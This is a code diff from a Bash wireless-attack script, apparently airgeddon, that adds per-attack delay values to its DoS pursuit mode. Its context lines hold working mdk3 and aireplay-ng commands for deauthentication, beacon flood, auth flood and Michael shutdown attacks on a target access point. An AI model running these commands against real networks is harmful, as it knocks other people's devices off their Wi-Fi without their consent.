@@ -2747,21 +2747,27 @@ function launch_dos_pursuit_mode_attack() {
 	case "${1}" in
 		"mdk3 amok attack")
 			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1}" -e mdk3 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
+			dos_delay=1
 		;;
 		"aireplay deauth attack")
 			${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
+			dos_delay=3
 			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1}" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface}" > /dev/null 2>&1 &
 		;;
 		"wids / wips / wds confusion attack")
+			dos_delay=10
 			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1}" -e mdk3 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
 		;;
 		"beacon flood attack")
+			dos_delay=1
 			xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "${1}" -e mdk3 "${interface}" b -n "${essid}" -c "${channel}" -s 1000 -h > /dev/null 2>&1 &
 		;;
 		"auth dos attack")
+			dos_delay=1
 			xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "${1}" -e mdk3 "${interface}" a -a "${bssid}" -m -s 1024 > /dev/null 2>&1 &
 		;;
 		"michael shutdown attack")
+			dos_delay=1
 			xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "${1}" -e mdk3 "${interface}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1 &
 		;;
 	esac
@@ -2769,7 +2775,7 @@ function launch_dos_pursuit_mode_attack() {
 	dos_pursuit_mode_attack_pid=$!
 	dos_pursuit_mode_pids+=("${dos_pursuit_mode_attack_pid}")
 
-	sleep 3
+	sleep ${dos_delay}
 	airodump-ng -w "${tmpdir}dos_pm" "${interface}" > /dev/null 2>&1 &
 	dos_pursuit_mode_scan_pid=$!
 	dos_pursuit_mode_pids+=("${dos_pursuit_mode_scan_pid}")
